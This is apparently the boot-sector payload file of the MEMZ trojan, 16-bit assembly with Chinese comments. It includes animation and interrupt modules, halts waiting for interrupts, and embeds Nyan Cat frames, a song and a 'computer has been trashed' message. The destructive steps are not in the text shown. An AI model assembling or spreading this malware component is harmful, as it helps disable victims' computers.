; 在解压缩后程序开始执行的地方

use16
org 0

%include "Utils/macros.asm"
%include "Setup/setup.asm"

; 所有设置都应该已经完成，所以这里我们只需要等待中断

haltLoop:
    hlt
    jmp haltLoop

; 在循环之后包含中断处理程序的代码，以防止它们在包含过程中触发中断
%include "Interrupts/timerHandler.asm"
%include "Interrupts/keyboardHandler.asm"

%include "Utils/timer.asm"

%include "Animation/countNyan.asm"
%include "Animation/displayFrame.asm"
%include "Animation/playNote.asm"

; ==============================
;            变量
; ==============================

; ==============================
;            数据
; ==============================

frames:        incbin "../../Build/frames.bin"
framesLength:  equ $-frames

special:       incbin "../../Build/special.bin"
specialLength: equ $-special

song:        incbin "../../Build/song.bin"
songLength:  equ $-song

message:       db "Your computer has been trashed by the MEMZ trojan. Now enjoy the Nyan Cat..."
messageLength: equ $-message
